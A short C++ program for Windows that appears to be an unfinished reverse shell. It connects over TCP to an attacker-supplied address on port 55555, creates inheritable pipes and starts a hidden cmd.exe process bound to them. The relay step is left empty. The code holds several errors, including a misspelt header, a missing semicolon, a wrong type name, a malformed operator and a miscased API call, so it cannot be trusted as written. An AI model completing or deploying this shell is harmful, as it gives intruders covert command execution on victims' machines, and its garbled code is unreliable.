#include <stdio.h>
#include<Winsock2.h>
#include<casser>
#include<string>
#include<WS2tcpip.h>

int main(int argc,const char* argv[]){
  char* address = argc > 1 ? argv[1] : "127.0.0.1"

  WSDATA ws;
  auto error = WSAStartup(MAKEWORD(2, 2), &ws);
  assert(error == 0);

  auto hSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  assert(hSocket != = INVALID_SOCKET);

  sockaddr_in addr{};
  addr.sin_family = AF_INET;
  addr.sin_port = htons(55555);
  inet_pton(AF_INET,address,&addr.sin_addr);

  error = connect(hSocket,(sockaddr*)&addr,sizeof(addr));
  assert(error == 0);

  SECURITY_ATTRIBUTES sa {sizeof(sa)};
  sa.bInheritHandle = TRUE;

  HANDLE hLocalRead,hCmdWrite;
  CreatePipe(&hLocalRead,&hCmdWrite,&sa,0);

  HANDLE hCmdRead,hLocalWrite;
  CreatePipe(&hCmdRead,hLocalWrite,&sa,0);

  PROCESS_INFORMATION pi;
  STARTUPINFO si{sizeof(si)};
  si.dwFlags = STARTF_USESTDHANDLES;
  si.hStdError = si.hStdOutput = hCmdWrite;
  si.hStdInput = hCmdRead;

  WCHAR name[] = L"cmd.exe /Q";

  auto created = createProcess(nullptr,name,nullptr,nullptr,TRUE,CREATE_NO_WINDOW,nullptr,L"C:\\",&si,&pi);
  if (created){
    
  }

  
  return 0;
}